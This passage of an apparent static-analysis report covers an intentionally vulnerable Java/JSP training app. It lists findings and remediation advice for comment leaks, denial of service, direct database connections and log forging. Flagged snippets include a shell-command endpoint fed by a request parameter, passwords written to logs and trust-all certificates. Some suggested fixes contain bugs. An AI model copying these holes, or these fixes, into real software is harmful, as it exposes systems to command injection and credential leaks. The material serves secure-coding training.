href=\"loadIndex.html\">Back</a></div>\n</div> -->"}]}, {"file": "WebContent/WEB-INF/jspViews/success.jsp", "items": [{"id": "IN00321", "function": "Comment()", "line": "46", "snippet": "<a href=\"loadStudentGrade.html\">Student Grade Details</a> <br>\n\n<!-- <a href=\"loadStudentGradeJSON.html\">Student Grade Details JSON</a> <br>\n\n<a href=\"listEmployee.html\">List Employee</a> <br> -->"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00322", "function": "Comment()", "line": "24", "snippet": "<br>\n<br>\n<!--alert(${_csrf.token}); alert(${_csrf.parameterName});-->\n<form id=\"fileuploadForm\" action=\"fileupload.html\" method=\"POST\" enctype=\"multipart/form-data\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />"}]}], "remediation": {"remediation": {"@id": "R.0152", "@name": "System Information Leak: HTML Comment in JSP", "@dateLastModified": "12/13/2020", "faqs": null, "recommendations": {"recommendation": {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">login.jsp\n\n</em>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;\n    pageEncoding=&quot;ISO-8859-1&quot;%&gt;\n&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot;%&gt;    \n&lt;link href=&quot;&lt;c:url value=&quot;/resources/css/style.css&quot;/&gt;&quot; rel=&quot;stylesheet&quot;&gt;   \n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;\n....\n<em class=\"red\">&lt;!-- validate against user from Account Table --&gt;</em>\n&lt;form action=&quot;validate.html&quot; method=&quot;post&quot;&gt;\n&lt;table align=&quot;center&quot;&gt;\n\t\t&lt;tr style=&quot;color:red&quot;&gt;&lt;center&gt;${msg}&lt;/center&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Username :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Password :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;button&quot; class=&quot;btn&quot;&gt;&lt;/center&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n &lt;/table&gt;\n &lt;/form&gt;", "nonvulncode": "<em class=\"bold\">login.jsp\n\n</em>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;\n    pageEncoding=&quot;ISO-8859-1&quot;%&gt;\n&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot;%&gt;    \n&lt;link href=&quot;&lt;c:url value=&quot;/resources/css/style.css&quot;/&gt;&quot; rel=&quot;stylesheet&quot;&gt;   \n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;\n....\n<em class=\"blue\">&lt;% HTML comments removed from jsp %&gt;\n&lt;% validate user %&gt;\n&lt;form action=&quot;validate.html&quot; method=&quot;post&quot;&gt;\n&lt;table align=&quot;center&quot;&gt;\n\t\t&lt;tr style=&quot;color:red&quot;&gt;&lt;center&gt;${msg}&lt;/center&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Username :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Password :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;button&quot; class=&quot;btn&quot;&gt;&lt;/center&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n &lt;/table&gt;\n &lt;/form&gt;</em>", "comments": "JSP pages treats the HTML comments like any other HTML tag, when view source is done, it will display the comments which will lead to system information leak. It is recommended to remove the comments from client side, if necessary hidden comments(eg.,&lt;% %&gt;) can be used for jsp's. A hidden comment is not sent to the client and can only be viewed in the JSP source code.", "impact": "No impact", "abstract": "Use of hidden comments"}}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Unchecked Return Value": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00323", "function": "delete()", "line": "856", "snippet": "if (isfileNameValid) {\n\t\t\t\tfile.delete();\n\t\t\t\tSystem.out.println(\"File deleted successfully\");\n\t\t\t\t//mv = executeCommand(\"dir\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00324", "function": "waitFor()", "line": "793", "snippet": "String commandArray[] = { \"cmd\", \"/c\", cmd, filePath};\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00325", "function": "mkdirs()", "line": "248", "snippet": "File dir = new File(rootPath + File.separator + \"tmpFiles\");\n\t\t\t\t\tif (!dir.exists())\n\t\t\t\t\t\tdir.mkdirs();\n\t\t\t\t\t\n\t\t\t\t\t// Create the file on server"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00326", "function": "mkdir()", "line": "283", "snippet": "File destDir = new File(destDirectory);\n\t\t        if (!destDir.exists()) {\n\t\t            destDir.mkdir();\n\t\t        }\n\t\t        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00327", "function": "waitFor()", "line": "720", "snippet": "Process process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00328", "function": "read()", "line": "397", "snippet": "int bytesToRead = 1024;\n            byte[] byteArray = new byte[bytesToRead];\n            inputStream.read(byteArray);\n            IOUtils.write(byteArray, response.getOutputStream());"}]}], "remediation": null}, "Denial of Service": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00329", "function": "readLine()", "line": "1169", "snippet": "StringBuffer response = new StringBuffer();\n\n\t\twhile ((inputLine = reader.readLine()) != null) {\n\t\t\tresponse.append(inputLine);\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00330", "function": "waitFor()", "line": "793", "snippet": "String commandArray[] = { \"cmd\", \"/c\", cmd, filePath};\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00331", "function": "readLine()", "line": "724", "snippet": "String line;\n\t\t\t\twhile (true) {\n\t\t\t\t\tline = r.readLine();\n\t\t\t\t\tif (line==null) {\n\t\t\t\t\t\tbreak;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00332", "function": "waitFor()", "line": "720", "snippet": "Process process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00333", "function": "readLine()", "line": "797", "snippet": "String line;\n\t\t\t\twhile (true) {\n\t\t\t\t\tline = r.readLine();\n\t\t\t\t\tif (line==null) {\n\t\t\t\t\t\tbreak;"}]}], "remediation": {"remediation": {"@id": "R.0031", "@name": "Denial of Service", "@dateLastModified": "1/15/2021", "faqs": {"faq": {"question": "We use DoS prevention from the cloud. So this will not apply, right?", "answer": "Wrong! The DoS protection offered by the cloud will protect against a large volume of requests made to the applicatin (DDoS). Hackers usually use large botnets to execute this types of attacke, and the cloud providers prevent on the network level the application to be overloaded."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Download()\n        {\n            // Open the stream and read it back.\n            string msg = &quot;&quot;;\n            using (StreamReader sr = System.IO.File.OpenText(Path.Combine(Server.MapPath(&quot;~/DataContents&quot;), &quot;ZipEntryOverwrite.txt&quot;)))\n            {\n                string line = &quot;&quot;;\n               <em class=\"red\"> while ((line = sr.ReadLine()) != null)</em>\n                {\n                    msg += line;\n                }\n            }\n            TempData[&quot;ContentMessage&quot;] = msg;\n            return View();\n        }", "nonvulncode": "public ActionResult Download()\n        {\n            // Open the stream and read it back.\n            //string msg = &quot;&quot;;\n            <em class=\"blue\">int MAX_STR_LEN = 10000;</em>\n            StringBuilder msg = new StringBuilder();\n            using (StreamReader sr = System.IO.File.OpenText(Path.Combine(Server.MapPath(&quot;~/DataContents&quot;), &quot;ZipEntryOverwrite.txt&quot;)))\n            {\n                int intC;\n                while ((intC = sr.Read()) != -1)\n                {\n                    char c = (char)intC;\n                    \n                    if (c == '\\n')\n                    {\n                        break;\n                    }\n                 <em class=\"blue\">   if (msg.Length &gt;= MAX_STR_LEN)\n                    {\n                        throw new Exception(&quot;input too long&quot;);\n                    }</em>\n                    msg.Append(c);\n                }\n            }\n            TempData[&quot;ContentMessage&quot;] = msg.ToString();\n            return View();\n        }", "comments": "Incase the attacker able to replace the file (huge file) it may lead to denial of service becaue the vulnerable code it will read everything in one go. \nWith the non-vulnerable code the application is reading 'per character' and place string length checking after appending to the stringbuilder variable.", "impact": "It might affect the performance of reading the file because it is per character in the file. According to the business functionalitiy, and expected file size, this will impact the I/O performance, possibly causing a DoS (exactly what we are trying to prevent!). \nIf this is the case, process a specific number of characters (e.g. 100 per time) and use the buffer to improve performance. The value will need to be tweaked based on the application functionality and requirements.", "abstract": "Limit string length process"}, {"@type": "JAVA/JSP", "vulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView executeCommand( @RequestParam(value=&quot;cmd&quot;)String cmd) {\n\t\tlogger.debug(&quot;Command Execution started&quot;);\n\t\tModelAndView mv = new ModelAndView();\n\t\tList&lt;String&gt; dirList = new ArrayList&lt;String&gt;();\n\t\tboolean isCmdValid = Pattern.matches(&quot;^[a-zA-Z0-9. /:]{2,25}$&quot;, cmd);\n\t\tList&lt;String&gt; whiteListCmd = Arrays.asList(&quot;cd&quot;,&quot;dir&quot;,&quot;type&quot;); \n\t\tString[] inputCmd = cmd.split(&quot; &quot;);\n\t\t\n\t\tisCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -&gt; wlcmd.matches(inputCmd[0]));\t\t\n\t\t\n\t\tif (isCmdValid) {\n\t\t\tString commandArray[] = { &quot;cmd&quot;, &quot;/c&quot;, cmd, &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles&quot; };\n\t\t\ttry {\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor(15,TimeUnit.Seconds);\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;\n\t\t\t\twhile (true) {\n\t\t\t\t<em class=\"red\">\tline = r.readLine();\n\t\t\t\t\tif (line == null) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tSystem.out.println(line);\n\t\t\t\t\tdirList.add(line);</em>\n\t\t\t\t}\n\t\t\t\tr.close();\n\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\tmv.addObject(&quot;dirlist&quot;, dirList);\n\t\t\t}", "nonvulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView executeCommand( @RequestParam(value=&quot;cmd&quot;)String cmd) {\n\t\tlogger.debug(&quot;Command Execution started&quot;);\n\t\tModelAndView mv = new ModelAndView();\n\t\tList&lt;String&gt; dirList = new ArrayList&lt;String&gt;();\n\t\tboolean isCmdValid = Pattern.matches(&quot;^[a-zA-Z0-9. /:]{2,25}$&quot;, cmd);\n\t\tList&lt;String&gt; whiteListCmd = Arrays.asList(&quot;cd&quot;,&quot;dir&quot;,&quot;type&quot;); \n\t\tString[] inputCmd = cmd.split(&quot; &quot;);\n\t\t\n\t\tisCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -&gt; wlcmd.matches(inputCmd[0]));\t\t\n\t\t\n\t\tif (isCmdValid) {\n\t\t\tString commandArray[] = { &quot;cmd&quot;, &quot;/c&quot;, cmd, &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles&quot; };\n\t\t\ttry (InputStream input = EmployeeController.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\t\tProperties prop = new Properties();\t\n\t\t\t\tprop.load(input);\n\t\t\t\t<em class=\"blue\">int MAX_STR_LEN = Integer.parseInt(prop.getProperty(&quot;sec_max_strlen&quot;));\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArra</em>y);\n\t\t\t\t<em class=\"blue\">process.waitFor(15,TimeUnit.Seconds);</em>\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;\n\t\t\t\tStringBuilder content = new StringBuilder();\n\t\t        \t\t\t\t\n\t\t\t\tint value;\n\t\t\t\tint no_of_lines=0;\n<em class=\"blue\">if(r.ready()) //Checking the ready state</em>\n\t\t\t\twhile ((value = r.read()) != -1) {\n\t\t\t\t\tif (value == '\\n') {\n\t\t\t\t\t\tline = content.toString();\n\t\t\t\t\t\tdirList.add(line);\n\t\t\t\t\t\tno_of_lines++;\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n<em class=\"bold\">//Ensuring line length</em>\n\t\t\t\t\t<em class=\"blue\">if (content.length() &gt;= MAX_STR_LEN) {\n\t\t\t\t\t\tthrow new Exception(&quot;Line too long to read&quot;);\n\t\t\t\t\t}\n//Restricting no_of_lines\n</em>\t\t\t\t\t<em class=\"blue\">if(no_of_lines ==100) {\n\t\t\t\t\t\tlogger.info(&quot;File reached 100 lines. Execute next batch to retrieve another set of lines&quot;);\n\t\t\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;File reached 100 lines. Execute next batch to retrieve another set of lines.&quot;);\n\t\t\t\t\t}</em>\n\t\t\t\t\tcontent.append((char) value);\n\t\t\t\t}\n}\n\t\t\t\tr.close();\n\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\tmv.addObject(&quot;dirlist&quot;, dirList);\n\t\t\t}", "comments": "BufferedReader.ReadLine() method hangs at times when there is more lines of code to be read. Instead of using readline(), we can read per character and <em class=\"bold\">check the line size</em> with predefined line length to ensure we are not reading long lines. If there are more lines, it can be restricted to certain no.of.lines, and the rest of the<em class=\"bold\"> data can be read in batches</em>. Also, before reading the character, bufferedReader's <em class=\"bold\">ready state</em> can be checked to ensure there is character to read. By doing the mentioned things, we can prevent Denial of Service attack.\n\nFor the process.waitFor, timeout should be hardcoded value or fetched from config file. If there is user input to timeout, attacker can make use of the scenario, to do Denial of Service attack. In the mentioned sample, timeout is already hardcoded value.", "impact": "It might affect the performance of reading the file because it is per character in the file. According to the business functionalitiy, and expected file size, this will impact the I/O performance, possibly causing a DoS (exactly what we are trying to prevent!). \nIf this is the case, process a specific number of characters (e.g. 100 per time) and use the buffer to improve performance. The value will need to be tweaked based on the application functionality and requirements.", "abstract": "Use of ready(), ensuring line length, no_of_lines read."}]}, "mitigations": null}}}, "J2EE Bad Practices: getConnection()": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00334", "function": "getConnection()", "line": "69", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t      \n\t\t     Statement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00335", "function": "getConnection()", "line": "100", "snippet": "List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();\n\n\t\tconn = DriverManager.getConnection(dburl, uName, password);\n\n\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00336", "function": "getConnection()", "line": "136", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\t\n\t\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\t\n\t\t\t\t//Statement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00337", "function": "getConnection()", "line": "217", "snippet": "conn = DriverManager.getConnection(\"jdbc:sqlserver://localhost:1433;databaseName=VulnAppDB\",\"gurupriya\" , password.toString());\n\t\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00338", "function": "getConnection()", "line": "323", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\n\t\t\tStatement stmt = conn.createStatement();"}]}], "remediation": {"remediation": {"@id": "R.0188", "@name": "J2EE Bad Practices: getConnection()", "@dateLastModified": "2/12/2021", "faqs": {"faq": {"question": "But the application is working, why having a direct connection is a problem?", "answer": "J2EE standard forbids the use of direct connection as it is a complex operation and hard to manage when there are multiple instances of the application accessing the DB. The modern Web application pool is designed to manage the different application instances properly and even if the tests are passing, in production it has a high probability of failure. Leveraging the connection pool has minimal impact on the code and is an easy to implement fix."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">LoginDAO.java</em>\npublic UserProfileForm addUserProfile(UserProfileForm userProfile) throws SQLException {\n\t\t\n\t\tConnection conn = null;\n\t\t\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new EncryptableProperties(encryptor);\t\t\n\t\t\tprop.load(input);\n\t\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_db_password&quot;);\t\t\n\t\t\n\t\t\t<em class=\"red\">conn = DriverManager.getConnection(dbURL,dbuser , dbpwd);</em>\n\t\t\tStatement stmt = conn.createStatement();\n....\n}", "nonvulncode": "<em class=\"bold\">LoginDAO.java</em>\npublic UserProfileForm addUserProfile(UserProfileForm userProfile) {\n\t  \n\t<em class=\"blue\">  EntityManager em=entityManagerFactory.createEntityManager();</em>\n\t  \n\t  UserProfileEntity entity = new UserProfileEntity();\n\t  BeanUtils.copyProperties(userProfile, entity);\n\t  \n\t  em.getTransaction().begin(); \nem.persist(entity);\n\t  em.getTransaction().commit();\n\t  \n\t  return userProfile; \n\t  }\n<em class=\"bold\">\nsec-spring-jpaconfig.xml</em>\n&lt;bean id=&quot;dataSource&quot; class=&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot; &gt;\n        &lt;property name=&quot;driverClassName&quot; value=&quot;${sec_db_driver}&quot; /&gt;\n        &lt;property name=&quot;url&quot; value=&quot;${sec_db_url}&quot; /&gt;\n        &lt;property name=&quot;username&quot; value=&quot;${sec_user}&quot; /&gt;\n        &lt;property name=&quot;password&quot; value=&quot;${sec_password}&quot; /&gt;\n    &lt;/bean&gt;\n \n    &lt;bean id=&quot;entityManagerFactory&quot;\tclass=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;\n\t\t&lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt;\n\t\t&lt;property name=&quot;jpaVendorAdapter&quot;&gt;\n\t\t\t&lt;bean class=&quot;org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter&quot;&gt;\n\t\t\t\t&lt;property name=&quot;showSql&quot; value=&quot;true&quot; /&gt;\n\t\t\t\t&lt;property name=&quot;generateDdl&quot; value=&quot;true&quot; /&gt;\n\t\t\t\t&lt;property name=&quot;databasePlatform&quot; value=&quot;org.hibernate.dialect.SQLServer2012Dialect&quot; /&gt;\n\t\t\t&lt;/bean&gt;\n\t\t&lt;/property&gt;\n\t\t&lt;property name=&quot;packagesToScan&quot; value=&quot;com.accenture.sec.entity&quot;&gt;&lt;/property&gt;\n\t&lt;/bean&gt;", "comments": "It is recommended to use the container's resource management facilities to obtain connections to resources. In this non vulnerable sample we are using entitymanager factory\n\nReference : https://stackoverflow.com/questions/16100034/how-to-resolve-java-ee-bad-practices-direct-management-of-connections", "impact": "No impact", "abstract": "Use of EntityManagerFactory"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">LoginDAO.java</em>\npublic List&lt;UserAccountBean&gt; listUser() throws SQLException, NamingException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\t\n\t\tConnection conn = null;\n\t\t\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new EncryptableProperties(encryptor);\t\t\n\t\t\tprop.load(input);\n\t\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_db_password&quot;);\t\t\n\t\t\n\t\t\t<em class=\"red\">conn = DriverManager.getConnection(dbURL,dbuser , dbpwd);</em>\n\t\t\tStatement stmt = conn.createStatement();\nString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\n\t\t\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\t\twhile (rs.next()) {\n\t\t\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\t\t\tGuardedString gs = new GuardedString(rs.getString(&quot;Password&quot;).toCharArray());\n\t\t\t\t\tuserAccount.setPwd(gs);\n\t\t\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\n\t\t\t\t\tlistUsers.add(userAccount);\n\t\t\t\t}", "nonvulncode": "<em class=\"bold\">LoginDAO.java</em>\npublic List&lt;UserAccountBean&gt; listUser() throws SQLException, NamingException {\n\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\t\nConnection conn = null;\t\ntry{\t\t\n\t\t<em class=\"blue\">InitialContext ctx = new InitialContext();\n\t\t\tDataSource datasource = (DataSource) ctx.lookup(&quot;java:comp/env/jdbc/UsersDB&quot;);\n</em>\n\t\t\tif (datasource != null) {\n\t\t\t\tconn = datasource.getConnection();\n\t\t\t}\nStatement stmt = conn.createStatement();\nString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\n\t\t\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\t\twhile (rs.next()) {\n\t\t\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\t\t\tGuardedString gs = new GuardedString(rs.getString(&quot;Password&quot;).toCharArray());\n\t\t\t\t\tuserAccount.setPwd(gs);\n\t\t\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\n\t\t\t\t\tlistUsers.add(userAccount);\n\t\t\t\t}", "comments": "In this non vulnerable sample, we will get the connection by using JNDI lookup.", "impact": "No impact", "abstract": "Use of JNDI lookup"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Log Forging (debug)": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00339", "function": "org.slf4j.Logger.debug()", "line": "98", "snippet": "public static void main(String[] args) {\n\t\tlogger.debug(\"Entered main user with username and password\"+args[0]);\n\t\ttry {\n\t\t\tfinal TrustManager[] trustAllCerts = new TrustManager[] { new DefaultTrustManager() };"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00340", "function": "org.slf4j.Logger.debug()", "line": "167", "snippet": "String password = request.getParameter(\"pwd\");\n\t\t//logger.debug(\"Inside login validation debug\"+Encode.forHtmlAttribute(uname)+\"without encoding\"+uname+Encode.forHtmlAttribute(password));\n\t\tlogger.debug(\"Inside login validation debug \"+ uname +\" without encoding\" + uname + password);\n\t\t\n\t\tModelAndView mv= new ModelAndView();"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00341", "function": "org.slf4j.Logger.debug()", "line": "198", "snippet": "bean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(\"pwd\"));\n\t\tlogger.debug(\"Entering Employee secure application with username and passowrd\"+request.getParameter(\"pwd\"));\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00342", "function": "org.slf4j.Logger.debug()", "line": "187", "snippet": "char[] chars = (request.getParameter(\"pwd\").toCharArray());\n\t\tlogger.debug(\"Inside login validation debug\"+request.getParameter(\"pwd\"));\n\n\t\t// authentication process"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00343", "function": "org.slf4j.Logger.debug()", "line": "167", "snippet": "String password = request.getParameter(\"pwd\");\n\t\t//logger.debug(\"Inside login validation debug\"+Encode.forHtmlAttribute(uname)+\"without encoding\"+uname+Encode.forHtmlAttribute(password));\n\t\tlogger.debug(\"Inside login validation debug \"+ uname +\" without encoding\" + uname + password);\n\t\t\n\t\tModelAndView mv= new ModelAndView();"}]}], "remediation": {"remediation": {"@id": "R.0106", "@name": "Log Forging (debug)", "@dateLastModified": "3/9/2021", "faqs": {"faq": [{"question": "Why there are security problems when writting directly to the logs?", "answer": "Logs are critical assets on the security operation center, and any change on the log message / format or type may cause on detection avoidance on those SOC tools (SIEM, SOAR, etc.). If the user is able to write messages to the log the user may write special characters (e.g.: the special characters *U+202E* or #8238; makes the system to start reading backward, changing to arabic mode; or the user may add new lines containing special information to the SIEM tools like \\n2021-01-01 10:00:00 &lt;SYSTEM REBOOT, RELOAD LOG FILE&gt; that can cause an OT logging system to ignore the lines after this command and keep reloading the logs.)"}, {"question": "Can we add the encodin gto the log and present back to the user directly as is? There is no possible attack on this case, right?", "answer": "There should be no page in the application reflecting the exact data submitted by the browserwithout encoding it first to avoiud scripts."}]}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "import org.slf4j.Log<em class=\"red\">ger;</em>\npublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t<em class=\"red\">logger.debug(&quot;User Login with username&quot;+uname);</em>\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "nonvulncode": "import org.apache.logging.log4j.Logger; //log4j version 2 needs to be used, slf4j use log4j version<em class=\"blue\"> 1.x\n\n</em>public ModelAndView 